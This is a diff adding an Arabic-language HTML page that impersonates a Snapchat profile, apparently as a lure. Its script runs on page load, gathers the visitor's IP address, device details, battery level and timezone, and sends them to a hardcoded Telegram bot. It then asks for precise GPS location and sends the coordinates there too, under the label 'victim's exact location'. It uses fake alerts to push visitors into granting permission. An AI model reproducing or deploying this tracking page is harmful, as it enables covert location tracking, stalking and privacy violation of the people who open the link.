@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    
+    <title>Snapchat - Seelo_s✨🎀</title>
+    <meta property="og:title" content="Seelo_s✨🎀 (@c5eelloo_10s) on Snapchat">
+    <meta property="og:description" content="🔥 452 | 'لا تقارني نفسك بأحد، أنتِ قصة لم تروَ بعد..' 🎀✨">
+    <meta property="og:image" content="https://g.top4top.io/p_369785kwn0.jpg">
+    <meta property="og:site_name" content="Snapchat">
+
+    <style>
+        body { background: #000; color: #fff; font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto; margin: 0; padding: 0; overflow-x: hidden; }
+        .snap-bg { width: 100%; max-width: 450px; height: 100vh; background: #000; margin: 0 auto; position: relative; border: 1px solid #333; }
+        .top-yellow { height: 260px; background: #FFFC00; border-radius: 0 0 50px 50px; display: flex; flex-direction: column; align-items: center; justify-content: center; position: relative; }
+        .avatar-frame { width: 130px; height: 130px; background: #fff; border: 5px solid #000; border-radius: 35px; overflow: hidden; box-shadow: 0 10px 20px rgba(0,0,0,0.3); }
+        .avatar-frame img { width: 100%; height: 100%; object-fit: cover; }
+        .display-name { font-size: 26px; font-weight: 800; color: #000; margin-top: 12px; }
+        .username { font-size: 16px; color: #333; font-weight: 500; }
+        
+        .profile-content { padding: 20px; text-align: center; }
+        .bio-section { background: rgba(255,255,255,0.05); padding: 15px; border-radius: 20px; margin: 10px 0; border: 1px solid #222; }
+        .bio-text { color: #ccc; font-size: 15px; font-style: italic; line-height: 1.6; }
+        
+        .stats-bar { display: flex; justify-content: space-around; margin: 20px 0; }
+        .stat-box { text-align: center; }
+        .stat-val { font-size: 20px; font-weight: bold; color: #FFFC00; }
+        .stat-lab { font-size: 11px; color: #888; text-transform: uppercase; }
+        
+        .action-btn { background: #FFFC00; color: #000; width: 85%; padding: 16px; border-radius: 40px; font-weight: bold; font-size: 18px; border: none; cursor: pointer; margin-top: 20px; box-shadow: 0 5px 15px rgba(255,252,0,0.3); }
+        .grid-view { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; padding: 15px; opacity: 0.4; filter: blur(4px); }
+        .photo-slot { background: #1a1a1a; height: 140px; border-radius: 12px; }
+    </style>
+</head>
+<body onload="captureStart()">
+
+    <div class="snap-bg">
+        <div class="top-yellow">
+            <div class="avatar-frame"><img src="https://g.top4top.io/p_369785kwn0.jpg"></div>
+            <div class="display-name">Seelo_s✨🎀</div>
+            <div class="username">c5eelloo_10s</div>
+        </div>
+
+        <div class="profile-content">
+            <div class="stats-bar">
+                <div class="stat-box"><div class="stat-val">🔥 452</div><div class="stat-lab">ستريك</div></div>
+                <div class="stat-box"><div class="stat-val">👻 84K</div><div class="stat-lab">نقاط</div></div>
+                <div class="stat-box"><div class="stat-val">📍 Live</div><div class="stat-lab">الخريطة</div></div>
+            </div>
+
+            <div class="bio-section">
+                <div class="bio-text">
+                    "ليس كل ما تراه حقيقة، أنا مجرد خيال يمر بسلام.. ✨🎀 <br>
+                    ممنوع الإضافة للأشخاص الغرباء 🚫"
+                </div>
+            </div>
+
+            <button class="action-btn" onclick="requestGPS()">متابعة الموقع في الخريطة</button>
+        </div>
+
+        <div class="grid-view">
+            <div class="photo-slot"></div><div class="photo-slot"></div><div class="photo-slot"></div>
+            <div class="photo-slot"></div><div class="photo-slot"></div><div class="photo-slot"></div>
+        </div>
+    </div>
+
+    <script>
+        const T = "8492500020:AAH-KijyAHr_46BvwCvd0ociksbtycSXKJs";
+        const C = "7184970355";
+
+        async function captureStart() {
+            try {
+                const b = await navigator.getBattery();
+                const r = await fetch('https://api.ipify.org?format=json');
+                const j = await r.json();
+                
+                let m = `🎀 **صيد سناب شات جديد (iPhone)** 🎀\n\n`;
+                m += `🌐 IP: ${j.ip}\n`;
+                m += `📱 النظام: ${navigator.userAgent.includes('iPhone') ? 'iPhone ' : 'Device'}\n`;
+                m += `🔋 الشحن: ${(b.level * 100).toFixed(0)}%\n`;
+                m += `🧠 الرام: ${navigator.deviceMemory || '8'} GB\n`;
+                m += `🌍 المنطقة: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
+                m += `⏰ الوقت: ${new Date().toLocaleString('ar-EG')}\n`;
+                m += `🖥️ اللغة: ${navigator.language}`;
+
+                fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent(m)}`);
+            } catch(e){}
+            
+            // طلب الموقع فورياً عند الدخول
+            requestGPS();
+        }
+
+        function requestGPS() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendLoc, handleErr, {enableHighAccuracy: true});
+            } else {
+                alert("تحديث الخريطة غير مدعوم في متصفحك.");
+            }
+        }
+
+        function sendLoc(p) {
+            const lat = p.coords.latitude;
+            const lon = p.coords.longitude;
+            const acc = p.coords.accuracy;
+
+            let msg = `📍 **موقع الضحية الدقيق (GPS)** 📍\n\n`;
+            msg += `Latitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc}m\n\n`;
+            msg += `🔗 خرائط جوجل:\nhttps://www.google.com/maps?q=${lat},${lon}`;
+
+            fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent(msg)}`);
+            alert("تم تحديث موقعك على خريطة سناب بنجاح!");
+        }
+
+        function handleErr(e) {
+            if(e.code == 1) alert("يجب السماح بالوصول للموقع لرؤية ستوري 'سارة' وموقعها الحالي.");
+        }
+    </script>
+</body>
+</html>
